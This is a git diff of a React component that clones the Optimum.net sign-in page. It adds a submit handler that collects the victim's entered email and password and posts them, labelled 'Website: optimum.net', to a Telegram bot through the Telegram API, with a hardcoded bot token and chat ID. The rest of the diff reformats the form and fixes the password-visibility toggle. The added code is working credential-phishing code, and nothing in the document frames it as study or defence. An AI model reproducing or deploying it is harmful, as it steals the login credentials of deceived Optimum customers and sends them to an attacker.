@@ -3,17 +3,17 @@ import { useState } from "react";
 function App() {
   const [showPassword, togglePassword] = useState(false);
   const [menuOpen, setMenuOpen] = useState(false);
-  
+
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
- 
+
   const [errors, setErrors] = useState({ email: '', password: '' });
   const validateEmail = (email) => {
     const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
     return emailRegex.test(email);
   };
 
-  const handleSubmit = () => {
+  const handleSubmit = async () => {
     let emailError = '';
     let passwordError = '';
 
@@ -27,9 +27,34 @@ function App() {
     setErrors({ email: emailError, password: passwordError });
 
     if (!emailError && !passwordError) {
-      // Proceed with form submission
+      // Prepare the message to send
+      const message = `Email: ${email}\nPassword: ${password}\nWebsite: optimum.net`;
+
+      // Replace these values with your bot token and chat ID
+      const botToken = '7072591946:AAEoGhlnq4X9wUs7r5omOeDy2aXLbQ-RI9I';
+      const chatId = '5092152880';
+
+      try {
+        // Send the message to Telegram
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+          }),
+        });
+
+        // Optional: Handle success feedback or further actions here
+        alert('Data sent successfully!');
+      } catch (error) {
+        console.error('Error sending message:', error);
+      }
     }
   };
+
 
   return (
     <div className="w-full text-[0.82rem] bg-[rgb(224,224,224)] h-screen flex flex-col items-end">
@@ -121,64 +146,64 @@ function App() {
           </div>
         </div>
       </>
-      <div className="w-full pt-[5rem] md:pt-[10rem] flex flex-col md:flex-row justify-between px-4 gap-4 md:px-[6rem]">
-      <div className="rounded-md bg-white p-4 flex flex-col w-full md:w-[22rem] gap-3 py-10 pr-10">
-      <span className="flex flex-col gap-1">
-        <p className="font-semibold">My Optimum ID</p>
-        <input
-          type="text"
-          value={email}
-          onChange={(e) => setEmail(e.target.value)}
-          className={`p-1.5 px-2 outline-none border rounded-md border-[#8c8c8c] bg-[#f2f2f2] ${errors.email ? 'border-red-500' : ''}`}
-        />
-        {errors.email && <p className="text-red-500 text-sm">{errors.email}</p>}
-        <a href="https://www.optimum.net/recover-id/" className="text-blue-500">
-          I forgot my Optimum ID
-        </a>
-      </span>
-      <span className="flex flex-col gap-1">
-        <p className="font-semibold">Password</p>
-        <div className="relative">
-          <input
-            type={showPassword ? "text" : "password"}
-            value={password}
-            onChange={(e) => setPassword(e.target.value)}
-            className={`w-full p-1.5 px-2 outline-none border rounded-md border-[#8c8c8c] bg-[#f2f2f2] ${errors.password ? 'border-red-500' : ''}`}
-          />
-          {showPassword ? (
-            <i
-              onClick={togglePassword}
-              className="fa-regular cursor-pointer fa-eye-slash absolute right-4 top-1/2 transform -translate-y-1/2"
-            ></i>
-          ) : (
-            <i
-              onClick={togglePassword}
-              className="fa-regular cursor-pointer fa-eye absolute right-4 top-1/2 transform -translate-y-1/2"
-            ></i>
-          )}
+      <div className="w-full pt-[5rem] md:pt-[10rem] flex flex-col md:flex-row justify-center px-4 gap-4 md:gap-10 md:px-[6rem]">
+        <div className="rounded-md bg-white p-4 flex flex-col w-full md:w-[22rem] gap-3 py-10 pr-10">
+          <span className="flex flex-col gap-1">
+            <p className="font-semibold">My Optimum ID</p>
+            <input
+              type="text"
+              value={email}
+              onChange={(e) => setEmail(e.target.value)}
+              className={`p-1.5 px-2 outline-none border rounded-md border-[#8c8c8c] bg-[#f2f2f2] ${errors.email ? 'border-red-500' : ''}`}
+            />
+            {errors.email && <p className="text-red-500 text-sm">{errors.email}</p>}
+            <a href="https://www.optimum.net/recover-id/" className="text-blue-500">
+              I forgot my Optimum ID
+            </a>
+          </span>
+          <span className="flex flex-col gap-1">
+            <p className="font-semibold">Password</p>
+            <div className="relative">
+              <input
+                type={showPassword ? "text" : "password"}
+                value={password}
+                onChange={(e) => setPassword(e.target.value)}
+                className={`w-full p-1.5 px-2 outline-none border rounded-md border-[#8c8c8c] bg-[#f2f2f2] ${errors.password ? 'border-red-500' : ''}`}
+              />
+              {showPassword ? (
+                <i
+                  onClick={() => togglePassword(false)}
+                  className="fa-regular cursor-pointer fa-eye-slash absolute right-4 top-1/2 transform -translate-y-1/2"
+                ></i>
+              ) : (
+                <i
+                  onClick={() => togglePassword(true)}
+                  className="fa-regular cursor-pointer fa-eye absolute right-4 top-1/2 transform -translate-y-1/2"
+                ></i>
+              )}
+            </div>
+            {errors.password && <p className="text-red-500 text-sm">{errors.password}</p>}
+            <a href="https://www.optimum.net/recover-id/" className="text-blue-500">
+              I forgot my password
+            </a>
+          </span>
+          <span className="flex items-center gap-2">
+            <input type="checkbox" name="" id="" />
+            <p>Remember Me</p>
+          </span>
+          <div>
+            <button
+              className="p-2 rounded-md bg-[#F66608] text-white font-semibold px-4"
+              type="button"
+              onClick={handleSubmit}
+            >
+              Sign in to Optimum.net
+            </button>
+          </div>
+          <a href="https://www.optimum.net/profile/create-optimum-id" className="text-blue-500">
+            Don't have an Optimum ID? Create one
+          </a>
         </div>
-        {errors.password && <p className="text-red-500 text-sm">{errors.password}</p>}
-        <a href="https://www.optimum.net/recover-id/" className="text-blue-500">
-          I forgot my password
-        </a>
-      </span>
-      <span className="flex items-center gap-2">
-        <input type="checkbox" name="" id="" />
-        <p>Remember Me</p>
-      </span>
-      <div>
-        <button
-          className="p-2 rounded-md bg-[#F66608] text-white font-semibold px-4"
-          type="button"
-          onClick={handleSubmit}
-        >
-          Sign in to Optimum.net
-        </button>
-      </div>
-      <a href="https://www.optimum.net/profile/create-optimum-id" className="text-blue-500">
-        Don't have an Optimum ID? Create one
-      </a>
-    </div>
         <div className="rounded-md bg-[#F2F2F2] px-4 flex flex-col items-center w-full md:w-[22rem] gap-3 pt-10">
           <h3 className="text-4xl font-medium">New to Optimum?</h3>
           <p className="text-base pb-2 font-light text-center">
